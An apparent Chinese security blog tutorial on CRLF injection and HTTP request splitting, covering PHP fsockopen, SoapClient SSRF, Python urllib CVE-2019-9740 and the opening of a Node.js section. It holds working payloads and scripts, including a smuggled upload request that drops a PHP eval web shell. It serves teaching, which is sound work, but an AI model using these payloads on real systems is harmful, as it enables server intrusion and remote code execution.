<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>CRLF注入浅析 | 月落花开</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CRLF注入浅析</h1><a id="logo" href="/.">月落花开</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a><a href="/ppt/"><i class="fa fa-archive"> ppt</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CRLF注入浅析</h1><div class="post-meta">2021-05-25<span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 5.1k</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 23</span><span class="post-meta-item-text"> Minutes</span></span></span></div><div class="post-content"><h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><ul>
<li>HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部最后一个字段有两个CRLF，首部和主体由两个CRLF分隔。<br>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</li>
</ul>
<h3 id="二、HTTP报文基础知识"><a href="#二、HTTP报文基础知识" class="headerlink" title="二、HTTP报文基础知识"></a>二、HTTP报文基础知识</h3><ol>
<li><p>CRLF : 指的是 <font color=#FF0000>回车符</font>(CR，ASCII 13，\r，%0d) 和 <font color=#FF0000>换行符</font>(LF，ASCII 10，\n，%0a)。</p>
</li>
<li><p>CRLF : 源自打字机，表明行的结束，计算机出现后沿用了这个概念。</p>
</li>
<li><p>回车符：光标移到行首，</p>
</li>
<li><p>换行符：光标垂直移到下行。</p>
</li>
</ol>
<ul>
<li>键盘上的回车键(Enter)就可以执行该操作。但是不同的操作系统，行的结束符是不一样的。    </li>
</ul>
<ol start="5">
<li><p>Windows：使用CRLF表示行的结束</p>
</li>
<li><p>Linux/Unix：使用LF表示行的结束</p>
</li>
<li><p>MacOS：早期使用CR表示，现在好像也用LF表示行的结束.</p>
</li>
</ol>
<ul>
<li>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示。</li>
</ul>
<h3 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h3><ul>
<li><p>HTTP响应报文的结构是：状态行、响应头部和响应包体。在HTTP规范中，换行使用CRLF来表示。其中响应头部中响应头与响应头之间用一个CRLF分隔，响应头部中最后一个响应头和响应包体之间用两个CRLF分隔。</p>
</li>
<li><p>根据这个分割规律（用一个CRLF分隔的就是不同的响应头，用两个CRLF分隔的就是最后一个响应头和响应包体），如果一个响应头的value中有一个CRLF，那么这个响应头的CRLF之前的内容作为本响应头的value，而CRLF之后的内容则会被作为另一个响应头（或响应包体）处理。如果用户的输入会设置到某响应头中的value，那么通过添加CRLF就可以进行CRLF注入攻击。</p>
<p>  <img src="/images/pasted-33.png" alt="upload successful"></p>
</li>
</ul>
<h3 id="四、容易形成漏洞的点"><a href="#四、容易形成漏洞的点" class="headerlink" title="四、容易形成漏洞的点"></a>四、容易形成漏洞的点</h3><ol>
<li><p><strong><font color=#ff4500>PHP fsockopen() 函数</font></strong></p>
<ul>
<li><p>fsockopen($hostname,$port,$errno,$errstr,$timeout)– 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
</li>
<li><p>服务端测试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">     $host&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">     $fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class="line">     if (!$fp) &#123;</span><br><span class="line">         echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Host: $host\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">         fwrite($fp, $out);</span><br><span class="line">         while (!feof($fp)) &#123;</span><br><span class="line">             echo fgets($fp, 128);</span><br><span class="line">         &#125;</span><br><span class="line">         fclose($fp);</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>首先我们尝试访问正常的url：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000</span><br></pre></td></tr></table></figure>
<p>可以看到在受害主机上发出的请求如图所示：<br><img src="/images/pasted-34.png" alt="upload successful"></p>
</li>
<li><p>接着我们访问带有CRLF注入的请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000%0d%0aSet-Cookie:%20PHPSESSID&#x3D;whoami</span><br></pre></td></tr></table></figure></li>
<li><p>可以看到在受害主机上发出的请求如图所示：此时发送的请求产生了CRLF注入。HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为 Host 首部字段这行结束了，Set-Cookie就会被认为是下一行，如下所示：<br><img src="/images/pasted-35.png" alt="upload successful"></p>
</li>
</ul>
</li>
<li><p><strong><font color=#ff4500>PHP SoapClient 类</font></strong></p>
<ul>
<li><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p>
</li>
<li><p>该类的构造函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。    </li>
</ul>
</li>
<li><p>知道上述两个参数的含义后，我们首先来发起一个正常的HTTP请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#x2F;aaa&#39;, &#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#39;));</span><br><span class="line">   $b &#x3D; serialize($a);</span><br><span class="line">   echo $b;</span><br><span class="line">   $c &#x3D; unserialize($b);</span><br><span class="line">   $c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
<p>发送一个正常的请求<br><img src="/images/pasted-36.png" alt="upload successful"></p>
</li>
<li><p>在 User-Agent 头部注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如下图所示，VPS 上监听到了请求，成功在HTTP头中插入了一个我们自定义的 cookie：<br><img src="/images/pasted-37.png" alt="upload successful"></p>
</li>
<li><p>注入发送 POST 数据包</p>
<ul>
<li>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。<br>对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。</li>
</ul>
<p>测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$post_data &#x3D; &#39;data&#x3D;whoami&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;3stu05dr969ogmprk28drnju93&#39;</span><br><span class="line">);</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;WHOAMI^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_data).&#39;^^^^&#39;.$post_data,&#39;uri&#39;&#x3D;&gt;&#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">$b &#x3D; str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$b);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>VPS 上监听到了 POST 数据：<br><img src="/images/pasted-38.png" alt="upload successful"></p>
</li>
</ul>
</li>
<li><p><strong><font color=#ff4500>Python urllib CRLF 注入漏洞（CVE-2019-9740）</font></strong></p>
<ul>
<li><p>Python是一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。urllib是其中的一个用于处理URL的模块。urllib2是其中的一个用于获取URL（统一资源定位符）的模块。<br>Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。<br>该漏洞早在2016年就被爆出（CVE-2016-5699），在之后的一段时间里不断爆出了python其他版本也存在该漏洞（CVE-2019-9740、CVE-2019-9947）。</p>
</li>
<li><p><strong>影响范围：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 2.x版本至2.7.16版本中的urllib2</span><br><span class="line">Python 3.x版本至3.7.2版本中的urllib</span><br></pre></td></tr></table></figure>
<p>在 HTTP 状态行注入恶意首部字段<br>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;</span><br><span class="line">#?a&#x3D;1 后面的那个HTTP&#x2F;1.1是为了闭合正常的HTTP状态行</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<p>执行代码后，VPS 上会监听到如下HTTP头：成功进行了CRLF注入<br><img src="/images/pasted-39.png" alt="upload successful"><br>如果是使用不存在漏洞的版本进行请求，则会直接进行报错<br><img src="/images/pasted-40.png" alt="upload successful"></p>
</li>
<li><p><strong>在 HTTP 状态行注入完整 HTTP 请求</strong><br>由于 Python Urllib 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 和 Host 字段影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。</p>
<ul>
<li>场景一，目标主机存在SSRF漏洞，且存在上传漏洞，但是上传点限制了只允许本机进行上传。<br>完整的上传请求如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>
编写脚本构造payload：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 435</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[whoami]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\\r\\n&quot;)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">#输出: HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:</span><br></pre></td></tr></table></figure>
构造完整的请求<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:&#39;</span><br><span class="line">#?a&#x3D;1 后面的那个HTTP&#x2F;1.1是为了闭合正常的HTTP状态行</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
如此目标主机就成功的向本地上传功能发送了一个上传请求<br><img src="/images/pasted-41.png" alt="upload successful"></li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>4. <font color=#ff4500>NodeJS 中的 CRLF Injection</font></strong></p>
<ul>
<li>背景<br>2018 年有研究者发现，当Node.js使用 http.get 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！<br><img src="/images/pasted-42.png" alt="upload successful"><br>深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的。</li>
<li><strong>HTTP 请求路径中的 Unicode 字符损坏</strong><br>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 \u0130 就会被截断为 \u30：<br><img src="/images/pasted-43.png" alt="upload successful"></li>
<li><strong>Unicode 字符损坏造成的 HTTP 拆分攻击</strong><br>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。<br>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：<br><font color=#FF0000>例如使用正常的CRLF注入并不能成功</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; var http &#x3D; require(&quot;http&quot;);</span><br><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;%0D%0A&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
